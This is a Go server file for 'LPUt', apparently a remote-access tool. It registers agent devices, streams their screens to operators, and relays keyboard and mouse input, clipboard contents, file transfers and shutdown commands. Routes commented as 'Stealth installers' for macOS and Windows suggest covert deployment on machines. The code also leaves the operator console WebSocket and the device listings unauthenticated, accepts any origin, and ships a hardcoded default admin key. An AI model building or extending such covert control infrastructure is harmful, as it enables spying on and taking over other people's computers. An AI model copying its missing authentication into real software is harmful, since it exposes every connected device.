package server

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"github.com/yatishydv/lput/internal/protocol"
	"github.com/yatishydv/lput/web"
)

var upgrader = websocket.Upgrader{
	CheckOrigin:  func(r *http.Request) bool { return true },
	ReadBufferSize:  65536,
	WriteBufferSize: 65536,
}

// Config holds server configuration.
type Config struct {
	Port       string
	TLSCert    string
	TLSKey     string
	APIKeys    map[string]string // apiKey → operatorName
}

// Server is the LPUt management server.
type Server struct {
	config   Config
	mu       sync.RWMutex
	devices  map[string]*DeviceConn     // deviceID → connection
	sessions map[string]*RemoteSession  // sessionID → session
	operators map[string]*OperatorConn  // operatorSessionToken → connection
	audit    *AuditLogger
}

// DeviceConn represents a connected agent device.
type DeviceConn struct {
	Info       protocol.DeviceInfo
	Conn       *websocket.Conn
	WriteMu    sync.Mutex
	LastPing   time.Time
}

// OperatorConn represents a connected operator console.
type OperatorConn struct {
	Name         string
	Token        string
	Conn         *websocket.Conn
	WriteMu      sync.Mutex
	ActiveDevice string // deviceID being viewed
	SessionID    string
	frameChan    chan []byte
	stopChan     chan struct{}
}

// RemoteSession represents an active remote viewing/control session.
type RemoteSession struct {
	ID         string
	DeviceID   string
	OperatorID string
	CreatedAt  time.Time
	ExpiresAt  time.Time
	Active     bool
}

// New creates a new LPUt server.
func New(cfg Config) *Server {
	if cfg.APIKeys == nil {
		cfg.APIKeys = map[string]string{
			"lput-admin-key": "admin", // Default key for development
		}
	}
	return &Server{
		config:    cfg,
		devices:   make(map[string]*DeviceConn),
		sessions:  make(map[string]*RemoteSession),
		operators: make(map[string]*OperatorConn),
		audit:     NewAuditLogger(),
	}
}

// Start begins serving.
func (s *Server) Start() error {
	mux := http.NewServeMux()

	// API endpoints
	mux.HandleFunc("/api/auth", s.handleAuth)
	mux.HandleFunc("/api/devices", s.handleDevices)
	mux.HandleFunc("/api/sessions", s.handleSessions)

	// WebSocket endpoints
	mux.HandleFunc("/ws/agent", s.handleAgentWS)
	mux.HandleFunc("/ws/console", s.handleConsoleWS)

	// Stealth installers
	mux.HandleFunc("/mac", s.handleMacInstaller)
	mux.HandleFunc("/win", s.handleWinInstaller)

	// Embedded web management console
	mux.Handle("/", http.FileServer(http.FS(web.StaticFS)))

	// Start session expiry goroutine
	go s.sessionCleanup()
	// Start heartbeat check
	go s.heartbeatCheck()

	addr := ":" + s.config.Port
	log.Printf("[LPUt Server] Starting on %s", addr)
	s.audit.Log(LevelInfo, "server_start", fmt.Sprintf("Server starting on %s", addr), "")

	if s.config.TLSCert != "" && s.config.TLSKey != "" {
		log.Printf("[LPUt Server] TLS enabled (cert: %s)", s.config.TLSCert)
		return http.ListenAndServeTLS(addr, s.config.TLSCert, s.config.TLSKey, mux)
	}
	log.Printf("[LPUt Server] WARNING: Running without TLS. Use --tls-cert and --tls-key for production.")
	return http.ListenAndServe(addr, mux)
}

// handleAuth authenticates an operator via API key.
func (s *Server) handleAuth(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req protocol.AuthRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	operatorName, ok := s.config.APIKeys[req.APIKey]
	if !ok {
		s.audit.Log(LevelWarning, "auth_failed", fmt.Sprintf("Failed auth attempt for user: %s", req.Username), "")
		json.NewEncoder(w).Encode(protocol.AuthResponse{Success: false})
		return
	}

	// Generate session token
	token := generateToken(32)
	expiresAt := time.Now().Add(2 * time.Hour)

	s.audit.Log(LevelInfo, "auth_success", fmt.Sprintf("Operator authenticated: %s", operatorName), "")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(protocol.AuthResponse{
		Success:      true,
		OperatorID:   operatorName,
		SessionToken: token,
		ExpiresAt:    expiresAt.Unix(),
	})
}

// handleDevices lists registered devices.
func (s *Server) handleDevices(w http.ResponseWriter, r *http.Request) {
	// TODO: validate operator session token from header
	s.mu.RLock()
	defer s.mu.RUnlock()

	devices := make([]protocol.DeviceInfo, 0, len(s.devices))
	for _, d := range s.devices {
		devices = append(devices, d.Info)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(devices)
}

// handleSessions lists active sessions.
func (s *Server) handleSessions(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	sessions := make([]*RemoteSession, 0, len(s.sessions))
	for _, sess := range s.sessions {
		sessions = append(sessions, sess)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

// handleAgentWS handles WebSocket connections from endpoint agents.
func (s *Server) handleAgentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[Server] Agent WS upgrade error: %v", err)
		return
	}
	defer conn.Close()

	conn.SetReadLimit(16 * 1024 * 1024) // 16MB for screen frames

	var deviceID string

	for {
		messageType, data, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[Server] Agent disconnected: %v", err)
			break
		}

		if messageType == websocket.BinaryMessage {
			// Binary = screen frame data → forward to connected operator
			s.forwardFrameToOperator(deviceID, data)
			continue
		}

		var msg protocol.Message
		if err := json.Unmarshal(data, &msg); err != nil {
			log.Printf("[Server] Invalid agent message: %v", err)
			continue
		}

		switch msg.Type {
		case protocol.MsgDeviceRegister:
			regData, _ := json.Marshal(msg.Payload)
			var reg protocol.DeviceRegistration
			json.Unmarshal(regData, &reg)

			deviceID = reg.DeviceID
			if deviceID == "" {
				deviceID = uuid.New().String()
			}

			s.mu.Lock()
			s.devices[deviceID] = &DeviceConn{
				Info: protocol.DeviceInfo{
					DeviceID:     deviceID,
					Hostname:     reg.Hostname,
					OS:           reg.OS,
					Arch:         reg.Arch,
					OSVersion:    reg.OSVersion,
					AgentVersion: reg.AgentVersion,
					Status:       "online",
					LastSeen:     time.Now(),
				},
				Conn:     conn,
				LastPing: time.Now(),
			}
			s.mu.Unlock()

			s.audit.Log(LevelInfo, "device_registered",
				fmt.Sprintf("Device registered: %s (%s, %s %s)", reg.Hostname, deviceID, reg.OS, reg.OSVersion), deviceID)

			// Send registration confirmation
			sessionToken := generateToken(16)
			resp := protocol.Message{
				Type: protocol.MsgDeviceRegistered,
				Payload: protocol.DeviceRegistered{
					SessionToken: sessionToken,
					ServerTime:   time.Now().Unix(),
				},
			}
			writeJSON(conn, &sync.Mutex{}, resp)

		case protocol.MsgHeartbeat:
			s.mu.Lock()
			if dev, ok := s.devices[deviceID]; ok {
				dev.LastPing = time.Now()
				dev.Info.LastSeen = time.Now()
				dev.Info.Status = "online"
			}
			s.mu.Unlock()

		case protocol.MsgSystemInfo, protocol.MsgPermissionStatus, protocol.MsgClipboardUpdate, protocol.MsgFileTransferStart, protocol.MsgFileTransferChunk, protocol.MsgFileTransferEnd, protocol.MsgCursorPosition, protocol.MsgPerformanceStats:
			// Forward these messages from the agent to the connected operator
			s.forwardToOperator(deviceID, msg)
		}
	}

	// Cleanup on disconnect
	s.mu.Lock()
	if dev, ok := s.devices[deviceID]; ok {
		dev.Info.Status = "offline"
		s.audit.Log(LevelInfo, "device_disconnected", fmt.Sprintf("Device disconnected: %s", deviceID), deviceID)
	}
	s.mu.Unlock()
}

// handleConsoleWS handles WebSocket connections from operator management consoles.
func (s *Server) handleConsoleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[Server] Console WS upgrade error: %v", err)
		return
	}
	defer conn.Close()

	opToken := generateToken(16)
	op := &OperatorConn{
		Name:      "console",
		Token:     opToken,
		Conn:      conn,
		frameChan: make(chan []byte, 1),
		stopChan:  make(chan struct{}),
	}
	
	// Start dedicated sender goroutine for this operator
	go func() {
		for {
			select {
			case <-op.stopChan:
				return
			case frame := <-op.frameChan:
				op.WriteMu.Lock()
				_ = op.Conn.WriteMessage(websocket.BinaryMessage, frame)
				op.WriteMu.Unlock()
			}
		}
	}()

	s.mu.Lock()
	s.operators[opToken] = op
	s.mu.Unlock()

	defer func() {
		s.mu.Lock()
		delete(s.operators, opToken)
		close(op.stopChan)
		// End any active session
		if op.SessionID != "" {
			if sess, ok := s.sessions[op.SessionID]; ok {
				sess.Active = false
				delete(s.sessions, op.SessionID)
			}
			// Tell agent to stop streaming
			if dev, ok := s.devices[op.ActiveDevice]; ok {
				writeJSON(dev.Conn, &dev.WriteMu, protocol.Message{Type: protocol.MsgSessionEnd})
			}
		}
		s.mu.Unlock()
	}()

	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[Server] Console disconnected: %v", err)
			break
		}

		var msg protocol.Message
		if err := json.Unmarshal(data, &msg); err != nil {
			continue
		}

		switch msg.Type {
		case protocol.MsgListDevices:
			s.mu.RLock()
			devices := make([]protocol.DeviceInfo, 0)
			for _, d := range s.devices {
				devices = append(devices, d.Info)
			}
			s.mu.RUnlock()
			writeJSON(conn, &op.WriteMu, protocol.Message{
				Type:    protocol.MsgDeviceList,
				Payload: devices,
			})

		case protocol.MsgConnectDevice:
			payloadData, _ := json.Marshal(msg.Payload)
			var req protocol.ConnectDeviceRequest
			json.Unmarshal(payloadData, &req)

			s.mu.Lock()
			dev, ok := s.devices[req.DeviceID]
			if !ok || dev.Info.Status != "online" {
				s.mu.Unlock()
				writeJSON(conn, &op.WriteMu, protocol.Message{
					Type:  protocol.MsgError,
					Error: "Device not available",
				})
				continue
			}

			sessionID := uuid.New().String()
			sess := &RemoteSession{
				ID:         sessionID,
				DeviceID:   req.DeviceID,
				OperatorID: op.Name,
				CreatedAt:  time.Now(),
				ExpiresAt:  time.Now().Add(2 * time.Hour),
				Active:     true,
			}
			s.sessions[sessionID] = sess
			op.ActiveDevice = req.DeviceID
			op.SessionID = sessionID
			dev.Info.ActiveSession = sessionID
			s.mu.Unlock()

			s.audit.Log(LevelInfo, "session_start",
				fmt.Sprintf("Session %s started: operator=%s device=%s", sessionID, op.Name, req.DeviceID), req.DeviceID)

			// Tell agent to start streaming
			writeJSON(dev.Conn, &dev.WriteMu, protocol.Message{
				Type: protocol.MsgSessionStart,
				ID:   sessionID,
				Payload: protocol.QualityControl{
					Quality: req.Quality,
					FPS:     req.FPS,
				},
			})

			// Confirm to operator
			writeJSON(conn, &op.WriteMu, protocol.Message{
				Type: protocol.MsgSessionEstablished,
				ID:   sessionID,
				Payload: protocol.SessionEstablished{
					SessionID: sessionID,
					DeviceID:  req.DeviceID,
					Hostname:  dev.Info.Hostname,
				},
			})

		case protocol.MsgInputEvent, protocol.MsgClipboardRequest, protocol.MsgClipboardUpdate, protocol.MsgFileTransferStart, protocol.MsgFileTransferChunk, protocol.MsgFileTransferEnd:
			// Forward message from operator to the connected device agent
			s.mu.RLock()
			if op.ActiveDevice != "" {
				if dev, ok := s.devices[op.ActiveDevice]; ok {
					writeJSON(dev.Conn, &dev.WriteMu, msg)
				}
			}
			s.mu.RUnlock()

		case "ping":
			writeJSON(conn, &op.WriteMu, protocol.Message{
				Type:    "pong",
				Payload: msg.Payload,
			})

		case protocol.MsgAgentShutdown:
			s.mu.Lock()
			if op.ActiveDevice != "" {
				if dev, ok := s.devices[op.ActiveDevice]; ok {
					writeJSON(dev.Conn, &dev.WriteMu, msg)
					delete(s.devices, op.ActiveDevice)
				}
				if op.SessionID != "" {
					if sess, ok := s.sessions[op.SessionID]; ok {
						sess.Active = false
						delete(s.sessions, op.SessionID)
					}
					op.SessionID = ""
				}
				op.ActiveDevice = ""
			}
			s.mu.Unlock()

		case protocol.MsgQualityControl:
			s.mu.RLock()
			if op.ActiveDevice != "" {
				if dev, ok := s.devices[op.ActiveDevice]; ok {
					writeJSON(dev.Conn, &dev.WriteMu, msg)
				}
			}
			s.mu.RUnlock()

		case protocol.MsgSysInfoRequest:
			s.mu.RLock()
			if op.ActiveDevice != "" {
				if dev, ok := s.devices[op.ActiveDevice]; ok {
					writeJSON(dev.Conn, &dev.WriteMu, protocol.Message{Type: protocol.MsgSysInfoRequest})
				}
			}
			s.mu.RUnlock()

		case protocol.MsgDisconnect:
			s.mu.Lock()
			if op.SessionID != "" {
				if sess, ok := s.sessions[op.SessionID]; ok {
					sess.Active = false
					delete(s.sessions, op.SessionID)
				}
				if dev, ok := s.devices[op.ActiveDevice]; ok {
					writeJSON(dev.Conn, &dev.WriteMu, protocol.Message{Type: protocol.MsgSessionEnd})
					dev.Info.ActiveSession = ""
				}
				s.audit.Log(LevelInfo, "session_end",
					fmt.Sprintf("Session %s ended by operator", op.SessionID), op.ActiveDevice)
				op.ActiveDevice = ""
				op.SessionID = ""
			}
			s.mu.Unlock()
		}
	}
}

// forwardFrameToOperator sends screen frame data to the operator viewing this device.
func (s *Server) forwardFrameToOperator(deviceID string, data []byte) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	for _, op := range s.operators {
		if op.ActiveDevice == deviceID {
			// Non-blocking latest-frame drop strategy
			select {
			case op.frameChan <- data:
			default:
				// Drop the old frame and replace with the new one
				select {
				case <-op.frameChan:
				default:
				}
				// Send the latest frame
				select {
				case op.frameChan <- data:
				default:
				}
			}
		}
	}
}

// forwardToOperator sends a JSON message to operators viewing this device.
func (s *Server) forwardToOperator(deviceID string, msg protocol.Message) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	for _, op := range s.operators {
		if op.ActiveDevice == deviceID {
			writeJSON(op.Conn, &op.WriteMu, msg)
		}
	}
}

func (s *Server) sessionCleanup() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		s.mu.Lock()
		for id, sess := range s.sessions {
			if now.After(sess.ExpiresAt) {
				sess.Active = false
				delete(s.sessions, id)
				s.audit.Log(LevelInfo, "session_expired", fmt.Sprintf("Session %s expired", id), sess.DeviceID)
			}
		}
		s.mu.Unlock()
	}
}

func (s *Server) heartbeatCheck() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		s.mu.Lock()
		for _, dev := range s.devices {
			if dev.Info.Status == "online" && now.Sub(dev.LastPing) > 90*time.Second {
				dev.Info.Status = "offline"
				s.audit.Log(LevelWarning, "device_timeout",
					fmt.Sprintf("Device %s heartbeat timeout", dev.Info.DeviceID), dev.Info.DeviceID)
			}
		}
		s.mu.Unlock()
	}
}

func writeJSON(conn *websocket.Conn, mu *sync.Mutex, v interface{}) {
	mu.Lock()
	defer mu.Unlock()
	_ = conn.WriteJSON(v)
}

func generateToken(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return hex.EncodeToString(b)
}
